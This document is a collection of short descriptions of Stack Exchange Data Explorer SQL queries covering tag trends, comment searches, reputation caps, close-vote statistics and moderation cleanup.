This query is somewhat generic so that I can see trending for multiple tags. In this example I'm comparing different JavaScript Frameworks/Libraries, but these Tag names can be easily changed to any tag names you want. For a visual comparison, in the result click "Graph" tab. Very cool feature. I tried to make this a fast a possible by reviewing the execution plan. This probably can be made even faster, but happy with it now. Generic Query for Trending Multiple Tags Get the Tag IDs that you are interested in for the Tags table TagName IN ('android', 'ipad', 'iphone', 'blackberry', 'windows-mobile') TagName IN ('sql-server', 'oracle', 'mysql', 'mongodb', 'postgresql') TagName IN ('javascript', 'java', 'c#', 'vb.net', 'ruby-on-rails', 'ruby', 'php') TagName IN ('bing-maps', 'google-maps') TagName IN ('opengl', 'cuda') TagName IN ('fody', 'postsharp') Easily change date parameters First Day Of current Month

Find comments exchanged between two users. This finds all comments that user1 left on user2's posts and vice versa. This also attempts to find comments on third-party posts with @ mentions, but this is only approximative: it's based on users' current display names rather than the name at time of posting, it includes @ mentions that actually target another user with a similar name, it misses @ mentions that use a prefix of the name, and it misses the case where a user replies to the sole comment under their own post. It's difficult to do better considering the complex rules surrounding comment notification targets. Comments exchanged between two users

Do a generic T-SQL LIKE query on comment Markdown text and format the results nicely. Wildcards that work include % for any string, _ for any character, [ABCDE] or [A-E] for a letter from A to E, and [^ABCDE] or [^A-E] for any character *except* A to E. To match a literal "%", "_", "[" or "]", insert a backslash ("\") before it. Remember to wrap the search pattern in % signs if you don't want to anchor it to the beginning and/or end of the post, and remember that the content being searched is raw unparsed (mini-)Markdown, not HTML. This query will probably time out on SO unless you narrow down the date range! Try e.g. limiting the search to comments made within one or two years. On smaller sites, you can leave in the default values. Generic comment text LIKE search SearchPattern: Comment text to search for (T-SQL LIKE pattern, \ escapes) ExcludePattern: Comment text to exclude (T-SQL LIKE pattern, \ escapes) StartDate: Earliest comment date (YYYY-MM-DD) EndDate: Latest comment date (YYYY-MM-DD) MaxResults: Maximum number of result rows

Before enabling MathJax on Code Review (see request http://meta.codereview.stackexchange.com/q/1438), it would be a good idea to check whether any text in existing posts would be unintentionally rendered as TeX. Obviously, using $…$ delimiters would be a bad idea on Code Review, since $ is a very common character in programming languages. But would it be safe to use \$…\$ to delimit MathJax markup, as in Electrical Engineering Stack Exchange? This query strips out the code markup from all questions and answers, then looks for "\$". Hopefully, the search results turn out empty! (Display equations, created using $$…$$ as a complete paragraph, are difficult to trigger accidentally, so we shouldn't have to worry about those.) Is it safe to enable MathJax with \$ delimiters? Strip <code>...</code> blocks from the Body. SQL Server doesn't have a pattern substitution function, and Data Explorer doesn't allow CREATE FUNCTION, so we have to do this the hard way.

This is an ugly script that I hacked together in a few minutes to figure out if I had interacted with another Stack Overflow user in the past. Basically, it finds every question that a I have asked, answered, commented on, voted on or even the questions where I have commented on an answer. It finds the same list for the other user and then joins the two lists on the question Id. I did a Union All throughout so you will see a lot of duplicates but that is intentional. My thought would be that this is added valuable information (plus it makes the query faster). Have We Interacted Before

In this case, a "useful, unanswered question" refers to an unanswered question with a score of 1 or more, at least one favorite, and that is not closed. This query looks at the least common tags of each of those questions. The point is to examine the correlation between niche topics (determined by the least common tags) and unanswered questions which seems to be helpful. In the results, "Count" refers to the number of times the specified tag is the least common tag in a useful, unanswered question; "TagCount" refers to the total number of all questions which reference the tag; "%" is the percentage of times the tag occurs as the least common tag of a useful, unanswered question. Collelation of niche topics and good unanswered questions

The list will be arbitrary the first time you run the query, but due to caching, the list will likely be the same the next time you run it. It will also be potentially different from the list other users see. (Again, it depends on caching.) Finally, editing the text of the query invalidates the cache, so that's a way to get a new list.

This query measures the number of tags "created" by each user. A user is deemed to have "created" a tag if the user was the first person to either make an edit that added that tag or ask a question with that tag. This is not quite correct, since if a low-rep user asks a question on "X", the high-rep user who actually creates [X] will be credited with the creation of the tag, even though the low-rep user is the one who provided the opportunity for the tag to be created.

Well, this is a way to find out. It's as close as I can get to counting users' days which count towards socratic badges. It's not an exact count, since it doesn't include deleted posts (and deleted users' contribution?), but it's pretty close. So, every 100 or so points of "socratism" should translate into one socratic badge for that user. a question

This query tries to profile the activity/behaviour of new users on the site - Group the users in to monthly batches... all the users who joined in month X are grouped together. - Count the number of users in that month's intake. - Count the number of questions/answers that are asked by that month's intake for every week after they joined. - convert it to a percentage Reading the graph is as follows: Any data point represents the ratio of the number of posts in that week as a proportion of the number of users in the intake month for that curve. If a value at a given point is 10, and there were 1000 users that joined in that month, then it means that those users posted 100 questions/answers (100 / 1000 expressed as a percent). User Retention

Cliff questions are questions on the cliff of being deleted by the automatic cleanup. See http://meta.stackoverflow.com/questions/78048/enable-automatic-deletion-of-old-unanswered-zero-score-questions-after-a-year/92006#92006 for more information on this cleanup. Often, it will take just one or two downvotes to push it over the cliff into deletion.

There's a threshold value down below for adjusting that to any number of votes. You can set that threshold to a 0 to allow for ties. More details on that threshold at the bottom. the top scoring answer's score the question the answer belongs to answer posts question posts should have questions ignore closed questions ignore deleted questions this is the threshold digit ^ Threshold of 0 = question at least ties with its top answer's score. Threshold of 1 = at least 1 more vote, i.e. question outscores answers. Threshold of any positive number = at least that many more votes. Threshold of a negative number = nice job breaking it, hero.

Top most socratic users and their socratism If you're a little vain like myself, and get a lot of your reputation from question, also like myself, you often wonder who are the more distinguished question-askers than yourself. Well, this is a way to find out. It's as close as I can get to counting users' days which count towards socratic badges. It's not an exact count, since it doesn't include deleted posts (and deleted users' contribution?), but it's pretty close. So, every 100 or so points of "socratism" should translate into one socratic badge for that user. a question

By Stack Exchange policy, "Better fit elsewhere" is an insufficient justification for closing or migrating a question. However, this kind of abuse of custom close reasons is rampant. This is justification for a request to blacklist offending phrases from custom close reasons. http://meta.stackexchange.com/q/260769/148099 "I'm voting to close this question because it belongs on Code Review"

As decided in http://meta.codereview.stackexchange.com/q/2454, Code Review requires question titles to describe the purpose of the code, rather than the author's concern about the code. As a result, questions that do not follow that convention either need to have their titles revised, or they may be off-topic altogether. This query helps find such problematic questions. Quality control for questions whose title matches a pattern http://stackoverflow.com/a/2703 (Locked, Unlocked) Answers Questions

This measures a surrogate, which is the use of LaTeX \rangle (i.e. the Dirac ket marker ⟩) as a sign of how often the user uses that language. However, it doesn't really work - there's little correlation with the technical experts in the tag. Answers in QM tag vs QM answers with Dirac notation answers

Look for posts whose latest revision contains explicit newlines (`<br>` in HTML, resulting from either `<br>` or space-space-newline in the source), and that have been edited by a particular user. This query doesn't attempt to determine whether the `<br>` makes sense, because that requires intelligence. This query tries to determine whether the editor introduced the `<br>`, but only approximately, because I don't know how to do do it better. Posts containing <br> that have been edited by a particular user

This query lists questions that have been closed as duplicates of another question that has since been deleted. Such questions should be either deleted or, if they have good answers or are otherwise of decent quality, reopened. Note that non-locked questions with no answers and a negative score will be automatically deleted by the RemoveDeadQuestions script after 30 days, as indicated by the "Roombable?" column. By default, the results will be sorted with the most recently closed questions first. You can click the column headings to change the sort order. For example, questions with a high answer score may be good candidates for reopening (or for a historical lock), while questions with a high score but no answers may simply need a new dupe target (see http://meta.stackexchange.com/q/291824). Note that this list also includes some duplicates of migrated questions. Those are actually harmless, and there's generally no need to do anything about them. Duplicates of deleted questions

Best time to ask questions on StackExchange: Get answer faster BEST TIME TO ASK QUESTIONS The best time here is when the delay between a question and an accepted answer is shortest. On the graph, look for the value on the x-axis that corresponds to the minimum value on y-axis. That's the best time as defined above. As for Dec 2013, the smallest time-to-answer was for questions asked on Saturday at 1pm GMT. The asker had to wait for only 78 minutes. Axes: - X: Hours, days of week, or both 1.0 is Sunday, 12am GMT; 3.5 means Tuesday, 12pm GMT. - Y: Time-to-answer. The average difference between the time when the question was created and when the accepted answer was created. Parameters: - All: Include all users of only one specified by UserId Values: 0 - show stats for one user, 1 - for all users - Frequency: The scale of X-axis Values: 1 - hours, 2 - day of week, 3 - both - MaxTimeDiff: The cut off value for time difference. All time-to-answer above this value will be excluded from the statistics. Default value: 1440 min (24 hours). - UserId: Whose stats to include in calculations. Matters only when All = 0. Values: Your user ID or someone else's.

How many questions can a user close or reopen single-handedly thanks to having a gold badge in one of its tags? The exact rules are tricky, because the gold badge hammer can't be used if you edited the tags that would confer it. This query gives a lower bound (assuming any tag edit disaqualifies) and an upper bound (assuming no tag edit disqualifies). Adapted from http://data.stackexchange.com/stackoverflow/query/398987 by Undo. How many questions can I use the gold badge close hammer on?

I think factors that could predict probability of question getting answered during bounty period are: - question score at time of bounty placement - answer count at time of bounty placement - comment count at time of bounty placement - sort of a measure of interest - time since question was asked - favorite count (probably won't matter much, I'm guessing) Really I think the density of the questions is most important, but maybe I should leave it to the machine learning algorithms to figure that out.

Do a generic T-SQL LIKE query on post HTML content and format the results nicely. Wildcards that work include % for any string, _ for any character, [ABCDE] or [A-E] for a letter from A to E, and [^ABCDE] or [^A-E] for any character *except* A to E. To match a literal "%", "_", "[" or "]", insert a backslash ("\") before it. Remember to wrap the search pattern in % signs if you don't want to anchor it to the beginning and/or end of the post, and remember that the content being searched is parsed HTML, *not* Markdown. This query will probably time out on SO unless you narrow down the date range! Try e.g. limiting the search to posts made within one or two years. On smaller sites, you can leave in the default values. Generic post content LIKE search PostHTML: HTML code to search for (T-SQL LIKE pattern) ExcludeHTML: HTML code to exclude (T-SQL LIKE pattern or -) StartDate: Earliest posting date (YYYY-MM-DD) EndDate: Latest posting date (YYYY-MM-DD) MaxResults: Maximum number of result rows

When to post to get more views GETTING MORE VIEWS On the graph, look for the value on the x-axis that corresponds to the maximum value on y-axis. That's when questions get most views. As for Dec 2013, questions get more views when posted at 5am GMT. Axes: - X: Hours, days of week, or both 1.0 is Sunday, 12am GMT; 3.5 means Tuesday, 12pm GMT. - Y: Views per question created at time X. Parameters: - All: Include all users or only one specified by UserId Values: 0 - show stats for one user, 1 - for all users - Frequency: The scale of X-axis Values: 1 - hours, 2 - day of week, 3 - both - UserId: Whose stats to include in calculations. Matters only when All = 0. Values: Your user ID or someone else's. - YearsBack: How many previous years take into account. There're interesting changes in results as the number of years changes.

If you want to use this query for flagging, then you'll have problem due to the fact the database isn't updated in real time. It is suitable for things like statistics purposes. Please support http://meta.stackexchange.com/q/257243/242800 if you want closes reasons to appear correctly. csmu - Highest flag/close votes per questions with more control than in the flag queue. Question title. Number of pending flags per questions. Let click on the colum to see if the same user ask off-topic questions often. Interesting to see that some questions have more than 100 upvotes. I thought we shouldn't answer on off-topic post. Some questions seems to be very helpfull :) . The older is the question, the more is the chance that flags on them can't get reviewed. Similar effect as with Posts.CreationDate. How many peoples were too dumb to not close the question. The question is not closed. Questions with more flags have more chance to get them handled, and the higher is the probabilty that the question is off-topic (since several users already reviewed the question).

Less than performant query that takes all the words (sort of) that show up in post titles that have been closed a not constructive (I think) and selects the 10 that occur the most frequently. Added a filter for common words, but what it probably needs to do is analyze words that were and were not included in closed posts, then return only the top 10 that had no instances of non-constructive (or below a threshold?) Replace the "TOP 100 PERCENT" with a much smaller number, 1000 took about 40s when I ran it, 100 was about 300ms 10 Most Common Words Showing in Posts Closed as Not Constructive

Forked from query #59734 by sam.saffron. How many questions per month does each tag of your choice get? Now defaults to six tags, but it's easy to add more (up to 10k? See http://stackoverflow.com/questions/1869753/maximum-size-for-a-sql-server-query-in-clause-is-there-a-better-approach). You must enter a space-char (" ") for all the tags you DON'T need. You cannot leave any input-field empty, a value is required for all of them. The server will discard all blank tags and nonexisting tags. Interesting comparisons: (netbeans, eclipse, visual-studio), (perl, ruby), (clojure, java) Questions per month for up to 6 tags of your choice, compared

Lists the days that your cappable reputation exceeded the reputation cap. Known shortcoming: The vote times are erased, so every vote is logged as being at midnight UTC. This screws up the counting of votes after a post is auto-converted to Community Wiki. This means you will get credit for votes received on community wiki posts until the end of the day that they were converted to community wiki. Votes after that day will be correctly counted as community wiki, giving you no reputation. What days did I hit the reputation cap? On what days did I hit the reputation cap?

Benford's law, also called the first-digit law, states that in lists of numbers from many (but not all) real-life sources of data, the leading digit is distributed in a specific, non-uniform way. According to this law, the first digit is 1 about 30% of the time, and larger digits occur as the leading digit with lower and lower frequency, to the point where 9 as a first digit occurs less than 5% of the time. This distribution of first digits is the same as the widths of gridlines on the logarithmic scale.

This is a newer query to return the list of words that have the highest ratio of being used in 'closed as non-constructive' vs all posts. Although I've tried two different methods of splitting, the sheer amount of data and my rustiness with SQL optimization is causing all the methods I have tried to timeout, even when doing a pre-query for just words in closed posts. Currently running most recent 25% of posts and sorting by ratio desc, so words with largest chance of being closed. 10 Words Likely To Get Post Closed as Non-Constructive - Too Slow

Explain PostTypeId (Tutorial) The first query here (commented out; uncomment it and comment out from "SELECT DISTINCT" to run it) just returns post IDs with their numerical post types. Not very exciting, is it? Run this query, what does PostTypeId mean? It's a number! SELECT Top 100 Title, Id, PostTypeId FROM Posts ORDER BY Id DESC Now try this instead: This can be seen much easier if you click on the "i" icon next to the PostTypes table in the right-hand table list.

If you want to use this query for flagging, then you'll have problem due to the fact the database isn't updated in real time. It is suitable for things like statistics purposes. Please support http://meta.stackexchange.com/q/257243/242800 if you want closes reasons to appear correctly. Highest flag/close votes per questions with more control than in the flag queue. Question title. Number of pending flags per questions. Let click on the colum to see if the same user ask off-topic questions often. Interesting to see that some questions have more than 100 upvotes. I thought we shouldn't answer on off-topic post. Some questions seems to be very helpfull :) . The older is the question, the more is the chance that flags on them can't get reviewed. Similar effect as with Posts.CreationDate. How many peoples were too dumb to not close the question. The question is not closed. Questions with more flags have more chance to get them handled, and the higher is the probabilty that the question is off-topic (since several users already reviewed the question).

What reputation do people with Nice/Good/Great Question badges typically have? This query will produce a cumulative distribution of the current reputations of users that have earned nice-question-series badges. Specifically, it takes a score threshold and finds the reputation of the askers of all questions with that score (10 for Nice, 25 for Good, and 100 for Great Question). This is presented as a graph of the number of users on that list with up to the reputation on the horizontal axis. questions

Based on a reddit thread i was wondering how active certain javascript frameworks (and play) were from https://www.reddit.com/r/csharp/comments/4b49ed/mvc_javascript_framework/ Kitchen Sink: These are opinionated and have an idea about how you should do things from A-Z. Their opinions tend to cover how you should organize your app, how you should write your files, etc. Angular Meteor Ember DoneJs Aurelia Batteries included: These have less opinions about how you should structure things, and tend to be much smaller overall. You'll make more architecture decisions, but there will still be some ideas provided. You'll typically still have things like a router here. mithril.js riot.js knockback.js CanJs BYOA (bring your own architecture): These do one thing, and only one thing. Typically, that's the V part of MVC. The rest is up to you, from routing, to validation, etc. reactjs vue.js rivets.js Polymer Knockout Number of question for given tags in the last quarters Number of questions asked per quarter given specified tags.

Show tags having a number of questions within a given range. Be sure to set the min and max parameters appropriately if you change the bin size, or your last bin will be too small. If you want to plot past 9999 questions, you need to add another cross join for the #Integers table (or make the query better somehow).

With this query you'll be able to grit your teeth and curse your impetuousness when you see how many good question days you've wasted this way. And there's just one level of inner joining, to boot!

The proliferation of tags can mean that many questions have no popular tags. Such questions are more difficult to find, and do not contribute to enabling the "Generalist" badge for smaller sites. Here, choose a threshold (i.e., 40, for top 40 tags), and this query will return all questions that have no tags that popular. It will also provide the name of the question's most popular tag. Which questions have no popular tags? Threshold: Top tags threshold: "Returns all questions that have no tags in the top N tags" Calculate the number of questions that have the Nth largest tag AND Owner = 21576 Shows each question's most popular tag

Many questions have an high reputation along an high View Count and Number of Answers, but they don't match the criteria to be protected by Community Wiki. Many of them are old, and would be highly downvoted if they were asked know. Questions with an high wiew count and score but aren't protected. Question title. many Early question would only recieve downvotes if they were asked today. Let click on the colum to see if the same user ask off-topic questions often. Some questions seems to be very helpfull :) . The older is the question, the more is the chance that flags on them can't get reviewed. Similar effect as with Posts.CreationDate. The question is not closed. Score:Minimal score of the question. AnswerCount:Minimal number of Answers. ViewCount:Minimal number of Views.

This shows if a question has received any additional answers after having accepted one. To be more specific, this finds answers posted from the day after an answer was accepted onwards (since we cannot access the exact date the answer was accepted, dates get rewound back to midnight of that day). Does not account for possible changes of the accepted answer (e.g. q had accepted answer, new answer posted, changed accept vote to another answer).

Find out how many upvotes and downvotes a user has received for their questions and answers on a specified tag. Find out how many of a users answers have been accepted, or how many answers they've accepted themselves; in a tag of your choosing. Find out how much reputation they've gained in total from whatever tag you're wondering about! Just enter their unique user ID (found by clicking on their profile and then a tag, and it should be in the sidebar on the left, underneath the chosen tag). It does not function correctly for counting how many answers the user has accepted, but as far as I can tell, it does work for how many of their answers have *been* accepted. It also may count self-accepted-answers as 15 instead of 0. Total Reputation Gained from a Specific Tag by a User (approximate) reputation gained/lost on a specified tag only counts post upvotes and downvotes

Questions where the body is equal to the title. Question title. Number of pending flags per questions. Let click on the colum to see if the same user ask off-topic questions often. Interesting to see that such questions are sometimes asked by high rep users. Interesting to see that some questions have more than 100 upvotes. I thought we shouldn't answer on off-topic post. Some questions seems to be very helpfull :) . The older is the question, the more is the chance that flags on them can't get reviewed. Similar effect as with Posts.CreationDate. How many peoples were too dumb to not close the question. The question is not closed. Questions with more flags have more chance to get them handled, and the higher is the probabilty that the question is off-topic (since several users already reviewed the question).

An abnormally short interval between the time a question and answer are posted may be an indicator of collusion between users, especially if the question and answer are long. This query attempts to uncover such patterns of collusion. "Gun speed" is the length of the question-and-answer pair divided by response time, with the answer length weighted 9 times as much as the question length. Ideally, we should strip out the longest common substrings between the question and answer when considering the answer length. Fastest guns — Q&A collusion suspects Exclude selfies Exclude mysterious precognitive answers

Finding Questions To Answer User parameters for finding questions. Here is a brief description of what each parameter does. @SortingOption - What to sort the question results by. Possible inputs include: 'votes' 'views' @MinQuestionVotes - This one is self-explanatory. This parameter lets you choose the minimum amount of votes for question results. @QuestionTag - Again, another obvious one. This parameter lets you choose a tag that should be on a question. First off, let's create a CTE to avoid repetition when SELECTing our results.

This query will find most posts that contain at least one image that isn't hosted either on i.imgur.com or i.stack.imgur.com. Note that some images have legitimate reasons for being hosted off-site - maybe they're SVGs (not supported by imgur), or are larger than the imgur upload size limits (4 MB non-gif; 2 MB gif). Also, the [Snippet] column may list an imgur URL; this is because it just lists the URL of the first image it finds. There may still be non-imgur images elsewhere in the post. CLEANUP: Find images not hosted on imgur such as http://i.stack.imgur.com/ or http://i.imgur.com/

We sort by p.LastActivityDate because we want to find the questions that fell off the radar. The older they are, the easier they are to swoop in and answer. Plus, keep in mind that the StackOverflow database is only exported periodically - newer questions are more likely to have already been answered by someone since the database export was made.

Site upvote to downvote ratio Query By: Ktash Query for weighted and non-weighted upvote/downvote ratio. A higher reputation means a higher weight on upvotes/downvotes. The theory here is that as users are on the system more, their judgement should be a lot more refined, so they should vote a bit more in both directions and this should therefore represent better the communities overall ratio. The higher the rep, the greater the "weight" of your votes
